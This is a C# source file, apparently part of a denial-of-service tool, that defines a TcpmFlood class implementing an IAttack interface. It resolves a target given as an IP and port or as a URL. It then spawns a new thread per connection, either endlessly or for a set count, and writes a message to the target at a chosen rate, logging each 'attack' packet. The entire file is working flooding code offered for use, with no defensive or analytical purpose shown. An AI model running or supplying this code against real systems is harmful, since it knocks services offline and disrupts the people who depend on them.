using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class TcpmFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string message)
        {
            string ip;
            int port;

            try
            {
                if (target.StartsWith("http://") || target.StartsWith("https://"))
                {
                    Uri uri = new Uri(target);
                    IPAddress[] addresses = Dns.GetHostAddresses(uri.Host);
                    ip = addresses[new Random().Next(addresses.Length)].ToString();
                    port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
                }
                else
                {
                    string[] targetParts = target.Split(':');
                    if (targetParts.Length != 2 || !int.TryParse(targetParts[1], out port))
                    {
                        Console.WriteLine("Invalid target format. Use: IP:PORT or http://domain.com");
                        return;
                    }
                    ip = targetParts[0];
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing target: {ex.Message}");
                return;
            }

            int count = 0;
            int success = 0, failed = 0;
            Console.WriteLine($"[TCP] Attacking {ip}:{port} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Message: {message}");

            while (packetCount == -1 || count < packetCount)
            {
                int requestNumber = count + 1;
                Thread thread = new Thread(() =>
                {
                    using (TcpClient tcpClient = new TcpClient())
                    {
                        try
                        {
                            tcpClient.Connect(ip, port);
                            NetworkStream stream = tcpClient.GetStream();
                            byte[] data = Encoding.UTF8.GetBytes(message);
                            stream.Write(data, 0, data.Length);
                            Interlocked.Increment(ref success);
                            Console.WriteLine($"[TCP] Packet {requestNumber} sent to {ip}:{port} | Message : {message}");
                        }
                        catch
                        {
                            Interlocked.Increment(ref failed);
                            Console.WriteLine($"[{requestNumber}] TCP Connection FAILED!");
                        }
                    }
                });
                thread.Start();

                count++;
                Thread.Sleep(speed);
            }
        }
    }
}
